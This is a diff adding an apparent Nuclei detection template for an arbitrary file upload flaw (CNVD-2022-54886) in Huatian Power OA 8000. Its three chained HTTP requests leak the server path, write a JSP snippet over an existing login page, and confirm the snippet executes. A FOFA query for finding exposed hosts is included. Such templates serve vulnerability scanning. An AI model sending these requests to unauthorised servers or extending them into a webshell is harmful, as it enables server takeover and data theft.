@@ -1,0 +1,102 @@
+id: CNVD-2022-54886
+
+info:
+  name: Huatian Power OA 8000 - File Upload
+  author: qwtd
+  severity: critical
+  description: |
+    华天动力协同办公系统将先进的管理思想、管理模式和软件技术、网络技术相结合，为用户提供了低成本、高效能的协同办公和管理平台。
+    睿智的管理者通过使用华天动力协同办公平台，在加强规范工作流程、强化团队执行、推动精细管理、促进营业增长等工作中取得了良好的成效。
+    华天动力OA存在任意文件上传漏洞，攻击者可以上传任意文件，获取webshell，控制服务器权限，读取敏感信息等。
+  reference:
+    - https://mp.weixin.qq.com/s/Ite0aOtRp9SPrh4h8yNQwQ
+  metadata:
+    fofa: body="/OAapp/WebObjects/OAapp.woa" || body="/OAapp/htpages/app"
+  tags: 华天动力OA
+
+variables:
+  randomStr: "{{rand_text_alpha(12)}}"
+  rboundary: "{{rand_text_alpha(8)}}"
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - raw:
+      - |
+        POST /OAapp/jsp/upload.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="file"; filename="xxx.xml"
+        Content-Type: image/png
+        
+        real path
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="filename"
+        
+        xxx.png
+        ------WebKitFormBoundary{{rboundary}}--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "FILE"
+          - "webapps"
+        part: body
+        condition: and
+
+    extractors:
+      - type: regex
+        name: path
+        part: body
+        group: 1
+        regex:
+          - "(.*)/webapps"
+
+  - raw:
+      - |
+        POST /OAapp/htpages/app/module/trace/component/fileEdit/ntkoupload.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="EDITFILE"; filename="xxx.txt"
+        Content-Type: image/png
+        
+        <%out.print("{{randomStr}}");%>
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="newFileName"
+        
+        {{path}}/webapps/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp
+        ------WebKitFormBoundary{{rboundary}}--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /OAapp/htpages/app/module/login/normalLoginPageForOther.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: JSESSIONID=63A1AF6B0B60634BF5B8E71AB4D88B85
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{randomStr}}"
+        part: body
+      - type: word
+        words:
+          - "5DBB70"
+        part: body
